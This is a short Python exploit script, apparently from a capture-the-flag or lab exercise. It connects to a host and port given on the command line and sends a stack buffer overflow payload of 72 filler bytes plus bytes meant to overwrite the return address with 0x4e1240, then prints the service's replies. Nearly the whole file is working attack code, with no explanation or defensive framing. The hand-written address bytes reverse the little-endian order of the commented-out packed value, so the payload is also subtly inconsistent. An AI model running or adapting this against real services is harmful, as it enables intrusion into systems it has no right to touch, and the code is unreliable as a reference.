#!/usr/bin/env python3 

import socket
import argparse
import struct
import sys

parser = argparse.ArgumentParser()
parser.add_argument(
    "host",
    type=str,
    help="The hostname or IP to connect to",
)
parser.add_argument(
    "port",
    type=int,
    help="The port for the service to connect to",
)

args = parser.parse_args()

offset = 72
new_rip = struct.pack("<Q", 0x4e1240)
payload = b"".join(
    [
        b"A" * offset,
        #new_rip,
        b"\x4e\x12\x40\x00\x00",
    ]
)

#payload = b"A" * 72 + b"\x4e\x12\x40\x00\x00"
print(payload)

with socket.socket() as connection:
    connection.connect((args.host, args.port))
    print(connection.recv(4096))
    connection.send(payload)
    print(connection.recv(4096).decode("utf-8"))
    print(connection.recv(4096).decode("utf-8"))
    print(connection.recv(4096).decode("utf-8"))
    

